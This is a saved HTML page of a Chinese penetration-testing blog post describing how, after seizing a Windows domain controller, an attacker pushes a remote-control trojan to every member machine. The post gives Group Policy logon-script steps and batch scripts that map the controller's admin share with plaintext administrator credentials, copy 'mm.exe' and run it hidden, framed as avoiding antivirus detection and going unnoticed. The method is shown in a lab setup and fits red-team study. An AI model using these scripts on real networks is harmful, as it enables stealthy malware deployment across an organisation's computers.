@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.7.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-tonyGreen.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-tony.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-tony.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"redn3ck.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x01 背景内网渗透中，当控制到域控时，当然是再好不过，但如何控制成员机器或个人机呢，域管理员账号登录？太敏感，动作大；psexec,wmi..?杀软报毒，不要不信，亲身经历； 想要直接推送个远控，神不知鬼不觉的搞定成员； 那么问题来了，如何推送个exe？ 0x02 研究方法1查找大量相关资料，都没有现成的方法直接下发exe，然而吐司竟然也没有，最后，锁定了组策略开机脚本 域成员登录时，执行域控">
+<meta name="keywords" content="域渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透 - 域控下发文件并执行远控">
+<meta property="og:url" content="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/index.html">
+<meta property="og:site_name" content="redn3ck&#39;s blog">
+<meta property="og:description" content="0x01 背景内网渗透中，当控制到域控时，当然是再好不过，但如何控制成员机器或个人机呢，域管理员账号登录？太敏感，动作大；psexec,wmi..?杀软报毒，不要不信，亲身经历； 想要直接推送个远控，神不知鬼不觉的搞定成员； 那么问题来了，如何推送个exe？ 0x02 研究方法1查找大量相关资料，都没有现成的方法直接下发exe，然而吐司竟然也没有，最后，锁定了组策略开机脚本 域成员登录时，执行域控">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/AD-01.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/AD-02.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/AD-03.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/AD-04.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/AD-05.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/AD-06.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/AD-07.png">
+<meta property="og:image" content="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/AD-08.png">
+<meta property="og:updated_time" content="2018-05-09T01:38:09.257Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="域渗透 - 域控下发文件并执行远控">
+<meta name="twitter:description" content="0x01 背景内网渗透中，当控制到域控时，当然是再好不过，但如何控制成员机器或个人机呢，域管理员账号登录？太敏感，动作大；psexec,wmi..?杀软报毒，不要不信，亲身经历； 想要直接推送个远控，神不知鬼不觉的搞定成员； 那么问题来了，如何推送个exe？ 0x02 研究方法1查找大量相关资料，都没有现成的方法直接下发exe，然而吐司竟然也没有，最后，锁定了组策略开机脚本 域成员登录时，执行域控">
+<meta name="twitter:image" content="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/AD-01.png">
+
+<link rel="canonical" href="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>域渗透 - 域控下发文件并执行远控 | redn3ck's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">redn3ck's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">人不会飞就努力学走</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-read">
+
+    <a href="/read/" rel="section"><i class="fa fa-book fa-fw"></i>读书</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/blogAvatar2.jpg">
+      <meta itemprop="name" content="redn3ck">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="redn3ck's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          域渗透 - 域控下发文件并执行远控
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-03-01 20:03:34" itemprop="dateCreated datePublished" datetime="2018-03-01T20:03:34+08:00">2018-03-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2018-05-09 09:38:09" itemprop="dateModified" datetime="2018-05-09T09:38:09+08:00">2018-05-09</time>
+              </span>
+
+          
+            <span id="/2018/03/01/域渗透-域控下发文件并执行远控/" class="post-meta-item leancloud_visitors" data-flag-title="域渗透 - 域控下发文件并执行远控" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2018/03/01/域渗透-域控下发文件并执行远控/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2018/03/01/域渗透-域控下发文件并执行远控/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h1><p>内网渗透中，当控制到域控时，当然是再好不过，但如何控制成员机器或个人机呢，域管理员账号登录？太敏感，动作大；psexec,wmi..?杀软报毒，不要不信，亲身经历；</p>
+<p>想要直接推送个远控，神不知鬼不觉的搞定成员；</p>
+<p>那么问题来了，如何推送个exe？</p>
+<h1 id="0x02-研究"><a href="#0x02-研究" class="headerlink" title="0x02 研究"></a>0x02 研究</h1><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>查找大量相关资料，都没有现成的方法直接下发exe，然而吐司竟然也没有，最后，锁定了<strong>组策略开机脚本</strong></p>
+<p>域成员登录时，执行域控提前部署好的bat脚本，通过此脚本，IPC连接到域控，copy文件，在成员上执行。</p>
+<a id="more"></a>
+<p>环境：</p>
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>IP</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>win2008</td>
+<td>192.168.2.100</td>
+<td>域控</td>
+</tr>
+<tr>
+<td>win7</td>
+<td>192.168.2.200</td>
+<td>域成员</td>
+</tr>
+<tr>
+<td>ubuntu14.04</td>
+<td>192.168.2.250</td>
+<td>非域成员（cs）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="1-ad用户和计算机"><a href="#1-ad用户和计算机" class="headerlink" title="(1) ad用户和计算机"></a>(1) ad用户和计算机</h3><p>新建OU（名称任意）</p>
+<p><img src="AD-01.png" alt="AD-01"></p>
+<p>新建用户（redn3ck）</p>
+<p><img src="AD-02.png" alt="AD-02"></p>
+<h3 id="2-gpmc-msc组策略管理"><a href="#2-gpmc-msc组策略管理" class="headerlink" title="(2) gpmc.msc组策略管理"></a>(2) gpmc.msc组策略管理</h3><p><code>gpmc.msc</code>——右键<em>组策略对象</em>——<em>新建（ADcontrol）</em></p>
+<p><img src="AD-03.png" alt="AD-03"></p>
+<p>右键<em>ADcontrol</em>——<em>编辑</em>——<em>用户配置</em>——<em>windows设置</em>——<em>脚本</em>——<em>登录</em>——<em>显示文件</em>——新建<em>ADControl.bat</em></p>
+<p><img src="AD-04.png" alt="AD-04"></p>
+<p>代码如下<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span>  p@ssw0rd /user:administrator@red.com</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span>\c$\test\mm.exe c:\test\</span><br><span class="line"><span class="built_in">cmd</span> /c c:\test\mm.exe</span><br><span class="line"><span class="built_in">net</span> use * /<span class="built_in">del</span> /y</span><br></pre></td></tr></table></figure></p>
+<p><em>添加</em>——<em>浏览</em>——选择<em>ADControl.bat</em></p>
+<p><img src="AD-05.png" alt="AD-05"></p>
+<p>右键<em>OU</em>——<em>链接现有GPO</em>——选择<em>ADcontrol</em></p>
+<p><img src="AD-06.png" alt="AD-06"></p>
+<h3 id="3-刷新策略"><a href="#3-刷新策略" class="headerlink" title="(3) 刷新策略"></a>(3) 刷新策略</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure>
+<p><img src="AD-07.png" alt="AD-07"></p>
+<h3 id="4-重启域成员"><a href="#4-重启域成员" class="headerlink" title="(4) 重启域成员"></a>(4) 重启域成员</h3><p>使用新建账户(redn3ck)登录，成功copy文件，并执行</p>
+<p><img src="AD-08.png" alt="AD-08"></p>
+<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><h3 id="1-创建bat"><a href="#1-创建bat" class="headerlink" title="(1) 创建bat"></a>(1) 创建bat</h3><p>logon默认路径：<code>C:\Windows\SYSVOL\sysvol\red.com\scripts</code></p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//logon.bat</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span> <span class="number">12345</span>RDzxcvb! /user:administrator@red.com</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span>\c$\test\mm.exe c:\test</span><br><span class="line"><span class="built_in">cmd</span> /c <span class="built_in">start</span> c:\test\mm.exe</span><br></pre></td></tr></table></figure>
+<h3 id="2-执行"><a href="#2-执行" class="headerlink" title="(2) 执行"></a>(2) 执行</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user redn3ck /scriptpath:logon.bat</span><br></pre></td></tr></table></figure>
+<font color="red">注：执行时需要<code>cmd /c start</code>否则开机会有cmd窗口 </font>
+
+<h2 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h2><p><em>Domain computer</em>——<em>管理</em>——<em>添加用户到远程管理组</em></p>
+<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><ol>
+<li><p>脚本需要放在<em>《显示文件》</em>目录中，其他目录成员机无法访问到，因此也就无法执行    </p>
+</li>
+<li><p>域用户（redn3ck）在根目录均无权限，<code>windows\temp</code>目录可copy进去，但无法执行，因此copy时需选择有权限目录</p>
+</li>
+<li><p>实际环境中当然不能重启机器，只需要等待域成员账号开机登录即可</p>
+</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>redn3ck
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/" title="域渗透 - 域控下发文件并执行远控">https://redn3ck.github.io/2018/03/01/域渗透-域控下发文件并执行远控/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/域渗透/" rel="tag"><i class="fa fa-tag"></i> 域渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/01/18/getPass-一键批量获取远程终端凭据密码/" rel="prev" title="getPass - 一键批量获取远程终端凭据密码">
+      <i class="fa fa-chevron-left"></i> getPass - 一键批量获取远程终端凭据密码
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/03/28/Mysql注入-Sqlmap之tamper编写/" rel="next" title="Mysql注入 - Sqlmap之tamper编写">
+      Mysql注入 - Sqlmap之tamper编写 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-背景"><span class="nav-text">0x01 背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-研究"><span class="nav-text">0x02 研究</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#方法1"><span class="nav-text">方法1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-ad用户和计算机"><span class="nav-text">(1) ad用户和计算机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-gpmc-msc组策略管理"><span class="nav-text">(2) gpmc.msc组策略管理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-刷新策略"><span class="nav-text">(3) 刷新策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-重启域成员"><span class="nav-text">(4) 重启域成员</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法2"><span class="nav-text">方法2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-创建bat"><span class="nav-text">(1) 创建bat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-执行"><span class="nav-text">(2) 执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法3"><span class="nav-text">方法3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-总结"><span class="nav-text">0x03 总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="redn3ck"
+      src="/images/blogAvatar2.jpg">
+  <p class="site-author-name" itemprop="name">redn3ck</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/redn3ck" title="GitHub → https://github.com/redn3ck" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:NjMwOTM2MTkxQHFxLmNvbQ==" title="E-Mail → mailto:NjMwOTM2MTkxQHFxLmNvbQ==" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.qinqinyo.com" title="http://blog.qinqinyo.com" rel="noopener" target="_blank">Biglao</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">redn3ck</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"EIDP7CTzy2rVnpTjoahW31sf-9Nh9j0Va","app_key":"34qnzvkVKBvjy44KTH7uurgw","server_url":null,"security":true};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EIDP7CTzy2rVnpTjoahW31sf-9Nh9j0Va',
+      appKey     : '34qnzvkVKBvjy44KTH7uurgw',
+      placeholder: "整点？",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
